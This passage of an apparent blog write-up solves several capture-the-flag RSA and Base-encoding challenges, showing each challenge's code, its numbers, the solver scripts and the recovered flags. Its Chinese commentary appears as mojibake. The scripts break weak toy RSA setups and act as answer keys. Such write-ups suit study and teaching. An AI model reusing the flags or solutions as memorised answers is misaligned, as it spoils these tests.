class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>nè½¬10è¿›åˆ¶</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">3133337</span> </span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag.encä¸­æ˜¯ç»è¿‡base64åŠ å¯†çš„ æ‰€ä»¥éœ€è¦å…ˆè§£å¯†ä¸€ä¸‹æ‰èƒ½å¾—åˆ°cçš„å€¼</p>
<p>ä¹‹å‰æ²¡é‡åˆ°è¿‡è¿™ç§ï¼Œè§£å¯†å®Œcipherå°±ä¸çŸ¥é“å’‹åšäº†  çœ‹äº†ä¸‹æç¤ºå’Œåˆ«äººçš„wp éœ€è¦åŠ å¯†æ—¶ä½¿ç”¨äº†padding </p>
<p>![image-20240221093440173](/Users/mamor/Library/Application Support/typora-user-images/image-20240221093440173.png)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">n = <span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">cipher =<span class="string">&#x27;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line"><span class="comment"># print(cipher)</span></span><br><span class="line"></span><br><span class="line">key_info = RSA.construct((n, e, <span class="built_in">int</span>(d), p, q))</span><br><span class="line">key = RSA.importKey(key_info.exportKey())</span><br><span class="line">key = PKCS1_OAEP.new(key)</span><br><span class="line">flag = key.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="AFCTF-2018-BASE"><a href="#AFCTF-2018-BASE" class="headerlink" title="[AFCTF 2018]BASE"></a>[AFCTF 2018]BASE</h3><p>æœ¬æ¥py base64åº“ä¸€ç‚¹ç‚¹è§£ç çš„ å‘ç°æ˜¯ç–¯ç‹‚å¥—å¨ƒæœ‰ç‚¹éº»çƒ¦</p>
<p>çœ‹äº†ä¸‹wp ç›´æ¥å¾ªç¯</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;flag_encode.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">text = file.read()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b32decode(text ).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b64decode(text ).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b16decode(text ).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;textï¼&quot;</span>,text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment">#afctf&#123;U_5h0u1d_Us3_T00l5&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="HGAME-2023-week1-RSA"><a href="#HGAME-2023-week1-RSA" class="headerlink" title="[HGAME 2023 week1]RSA"></a>[HGAME 2023 week1]RSA</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c=<span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">n=<span class="number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">q = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;factordb.com_is_strong!&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LitCTF-2023-Euler"><a href="#LitCTF-2023-Euler" class="headerlink" title="[LitCTF 2023]Euler"></a>[LitCTF 2023]Euler</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,n-p-q+<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span></span><br><span class="line"><span class="string">c = 406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># phi = (p-1)(q-1) = pq-p-q+1 = n-p-q+1 </span></span><br><span class="line"><span class="comment"># c = pow(m,phi+2,n) = m^(phi+2) mod n = m^phi mod n  *  m^2 mod n</span></span><br><span class="line"><span class="comment"># æ¬§æ‹‰å®šç†  m^phi ä¸‰ 1 mod n  -&gt;  c = m^2 mod n</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span></span><br><span class="line">c = <span class="number">406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;a1a8887793acfc199182a649e905daab&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="HDCTF-2023-Math-Rsa"><a href="#HDCTF-2023-Math-Rsa" class="headerlink" title="[HDCTF 2023]Math_Rsa"></a>[HDCTF 2023]Math_Rsa</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> shin <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">a=<span class="built_in">pow</span>(p,<span class="number">2</span>,r)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line"><span class="string">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line"><span class="string">a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line"><span class="string">c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>a=pow(p,2,r)</p>
<p>a = p^2 mod r   ï¼Œa r å·²çŸ¥ å¯ä»¥è¿›ä¸€æ­¥æ±‚å‡ºp  æ±‚å‡ºpå n//p å¾—åˆ°q  ç„¶ååœ¨æ±‚phi d m</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line">r = <span class="number">145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line">a = <span class="number">55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line">c = <span class="number">12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p^((r-1)//2) mod r = 1</span></span><br><span class="line"><span class="comment"># a=pow(p,2,r)</span></span><br><span class="line"><span class="comment"># a = p^2 mod r   a r å·²çŸ¥ å¯ä»¥è¿›ä¸€æ­¥æ±‚å‡ºp  æ±‚å‡ºpå n//p å¾—åˆ°q  ç„¶ååœ¨æ±‚phi d m</span></span><br><span class="line"><span class="comment"># r%4==3</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291</span></span><br><span class="line">p2 = <span class="number">10393238680760106682068330079504927400023017668703262222099938883730714731279774539115772083330909231443250673803376520592094213873608775241097598890818459890825805707433039425020588461191209551582950712455537148377360546659885111322482174840763781771983328894358193926388929089085190683242441518733058810008</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment"># a = p^2 mod r æ±‚p</span></span><br><span class="line"><span class="comment"># r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line"><span class="comment"># a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line"><span class="comment"># R.&lt;x&gt;=PolynomialRing(Zmod(r))</span></span><br><span class="line"><span class="comment"># f=(x^2)-a</span></span><br><span class="line"><span class="comment"># ans=f.roots()</span></span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line"><span class="comment"># p = ans[0][0]</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># [(135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291, 1), (10393238680760106682068330079504927400023017668703262222099938883730714731279774539115772083330909231443250673803376520592094213873608775241097598890818459890825805707433039425020588461191209551582950712455537148377360546659885111322482174840763781771983328894358193926388929089085190683242441518733058810008, 1)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pow(p,(r-1)//2,r)==1</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line"><span class="comment"># assert pow(p2,(r-1)//2,r)==1</span></span><br><span class="line"><span class="comment"># sage æ±‚å‡º p æœ‰ä¸¤ä¸ªè§£ ä½†æ˜¯é¢˜ç›®ç»™å‡ºæ¡ä»¶  assert pow(p2,(r-1)//2,r)==1  p2ä¸æ»¡è¶³ æ‰€ä»¥åªæœ‰ä¸€ä¸ªp</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;HDCTF&#123;0ce04f81-516b-4132-81a2-b0b7166e03ad&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HGAME-2022-week3-Multi-Prime-RSA-ã€æ¬§æ‹‰å‡½æ•°ã€‘"><a href="#HGAME-2022-week3-Multi-Prime-RSA-ã€æ¬§æ‹‰å‡½æ•°ã€‘" class="headerlink" title="[HGAME 2022 week3]Multi Prime RSA ã€æ¬§æ‹‰å‡½æ•°ã€‘"></a>[HGAME 2022 week3]Multi Prime RSA ã€æ¬§æ‹‰å‡½æ•°ã€‘</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">s = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p ** <span class="number">2</span> * q ** <span class="number">3</span> * r ** <span class="number">5</span> * s ** <span class="number">7</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(s2n(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>output</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">61789932148719477384027458333380568978056286136137829092952317307711908353477</span></span><br><span class="line">q = <span class="number">91207969353355763685633284378833506319794714507027332929290701748727534193861</span></span><br><span class="line">r = <span class="number">105471299607375388622347272479207944509670502835651250945203397530010861809367</span></span><br><span class="line">s = <span class="number">83153238748903772448138307505579799277162652151244477391465130504267171881437</span></span><br><span class="line">n = <span class="number">1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>nå¯ä»¥åˆ†æˆå¤šä¸ªç´ æ•° ä¸” p q r s éƒ½å·²çŸ¥  ç®—å‡ºphiæ¥ æ±‚d å†æ±‚må³å¯</p>
<p>é€šè¿‡æ¬§æ‹‰å‡½æ•° è®¡ç®—phi(n) å¸¦å…¥ç„¶åæ‹†åˆ†å³å¯</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># n = p ** 2 * q ** 3 * r ** 5 * s ** 7</span></span><br><span class="line"><span class="comment"># phi(n) = phi(p*p) * phi(q*q*q) * phi(r*r*r*r*r) * phi(s*s*s*s*s*s*s)</span></span><br><span class="line"><span class="comment">#        = p* phi(p) * q^2* phi(q) * r^4*phi(r) * s^6*phi(s)</span></span><br><span class="line"><span class="comment">#        = p*(p-1) * q^2*(q-1) * r^4*(r-1) * s^6*(s-1)</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">61789932148719477384027458333380568978056286136137829092952317307711908353477</span></span><br><span class="line">q = <span class="number">91207969353355763685633284378833506319794714507027332929290701748727534193861</span></span><br><span class="line">r = <span class="number">105471299607375388622347272479207944509670502835651250945203397530010861809367</span></span><br><span class="line">s = <span class="number">83153238748903772448138307505579799277162652151244477391465130504267171881437</span></span><br><span class="line">n = <span class="number">1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</span></span><br><span class="line"></span><br><span class="line">phi_n = p*(p-<span class="number">1</span>) * q**<span class="number">2</span>*(q-<span class="number">1</span>) * r**<span class="number">4</span>*(r-<span class="number">1</span>) * s**<span class="number">6</span>*(s-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 